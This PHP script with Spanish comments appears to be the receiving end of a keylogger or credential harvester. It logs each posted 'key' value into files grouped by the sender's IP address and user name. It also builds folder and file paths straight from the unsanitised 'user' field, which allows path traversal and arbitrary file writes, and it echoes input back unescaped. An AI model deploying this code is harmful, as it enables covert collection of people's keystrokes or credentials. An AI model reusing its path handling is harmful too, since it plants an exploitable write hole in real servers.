<?php
$DateAndTime = date('m-d-Y h:i:s a', time());   // crea una fecha y hora actual  
if (isset($_POST['key']) && isset($_POST['user'])) {
    $key = $_POST['key'];   // obtiene el valor de la clave
    $user = $_POST['user']; // obtiene el valor del usuario
    $data = strval($DateAndTime);  // convierte el valor de la fecha y hora actual en una cadena
    $dat = strval(strval($_SERVER['REMOTE_ADDR'])) . "_" . $user; // IP + user
    mkdir("$dat");  // Crea carpeta con el nombre del usuario
    $arc = $dat . "/"  .  $data . "_" . strval($user) . ".txt";        // Nombre del archivo
    $guardar = fopen($arc, "a");    // Abrir archivo para escribir
    $data = $key . " " . $user;     // Datos a guardar
    echo $data;                 // Imprimir datos
    fwrite($guardar, $key . "\n");  // Escribir datos
    fclose($guardar);         // Cerrar archivo
}


